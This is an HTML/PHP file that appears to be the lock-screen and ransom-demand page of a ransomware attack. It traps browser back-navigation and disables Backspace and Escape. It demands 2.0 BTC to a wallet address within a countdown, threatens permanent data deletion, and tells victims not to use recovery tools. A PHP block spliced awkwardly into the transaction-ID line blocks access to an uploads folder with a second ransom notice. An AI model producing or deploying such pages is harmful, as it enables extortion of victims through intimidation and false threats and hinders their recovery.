<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM LOCKED ⚠️</title>
    <script>
        // Disable back button
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1);
        };
        
        // Disable keyboard navigation
        document.addEventListener("keydown", function(e) {
            if (e.key === "Backspace" || e.key === "Escape") {
                e.preventDefault();
            }
        });
    </script>
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 50px;
        }
        .warning {
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 20px auto;
            max-width: 600px;
            background-color: #1a0000;
        }
        .timer {
            font-size: 24px;
            color: #ffff00;
            margin: 20px 0;
        }
        .payment-info {
            background-color: #333;
            padding: 15px;
            margin: 20px auto;
            max-width: 500px;
            border: 1px solid #ff0000;
        }
        .payment-btn {
            background-color: #ff0000;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 20px 0;
        }
        .payment-btn:hover {
            background-color: #cc0000;
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ YOUR SYSTEM HAS BEEN LOCKED ⚠️</h1>
        <p>Your entire system has been locked by ransomware!</p>
        <p>You cannot access any applications, files, or system functions.</p>
        <p>All your personal data and system access has been blocked.</p>
    </div>

    <div class="timer">
        ⏰ TIME REMAINING: 24:00:00
    </div>

    <div class="payment-info">
        <h2>🔑 SYSTEM UNLOCK REQUIRED</h2>
        <p><strong>Amount:</strong> 2.0 BTC (Bitcoin)</p>
        <p><strong>Wallet Address:</strong> 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
        <p><strong>Payment Deadline:</strong> 24 hours</p>
        <p>⚠️ Failure to pay within 24 hours will result in permanent system lock!</p>
        <p>⚠️ All your data will be permanently deleted!</p>
        <p>⚠️ Price doubles after deadline!</p>
    </div>

    <p style="color: #ffff00;">Don't try to restart your system or use recovery tools - this may cause permanent damage!</p>

    <a href="unlock_locker.php" class="payment-btn">💰 PAY NOW & UNLOCK SYSTEM</a>

    <div style="margin-top: 30px; font-size: 12px; color: #666;">
        <p>Transaction ID: #LK-2024-<?php
session_start();
session_destroy();
session_regenerate_id(true);

// Block access to uploads folder
if (strpos($_SERVER['REQUEST_URI'], 'uploads') !== false) {
    http_response_code(403);
    echo '<!DOCTYPE html>
<html>
<head>
    <title>Access Denied</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #000; 
            color: #ff0000; 
            text-align: center; 
            padding: 50px; 
        }
        .warning { 
            border: 2px solid #ff0000; 
            padding: 20px; 
            max-width: 600px; 
            margin: 50px auto; 
            background: #1a0000; 
        }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ ACCESS DENIED ⚠️</h1>
        <p>Access to uploads folder is blocked during ransomware attack!</p>
        <p>Please pay the ransom to restore access.</p>
        <a href="ransom_locker.php" style="color: #ff0000; text-decoration: none;">Return to Ransom Page</a>
    </div>
</body>
</html>';
    exit();
}
?>
<?php echo rand(100000, 999999); ?></p>
    </div>
</body>
</html>
